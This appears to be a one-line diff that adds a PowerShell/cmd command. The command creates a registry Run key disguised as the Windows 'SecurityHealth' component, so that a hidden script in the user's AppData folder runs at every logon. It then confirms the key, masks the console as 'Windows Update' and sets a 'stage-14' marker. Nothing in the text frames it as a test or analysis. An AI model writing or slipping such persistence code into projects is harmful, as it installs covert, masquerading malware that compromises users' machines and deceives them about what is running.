@@ -1,0 +1,1 @@
+reg.exe add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v 'SecurityHealth' /t REG_SZ /d "powershell.exe -NoP -File $env:APPDATA\updater.ps1" /f; Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name 'SecurityHealth' -ErrorAction SilentlyContinue; $Host.UI.RawUI.WindowTitle = "Windows Update"; $StageMarker = "stage-14"
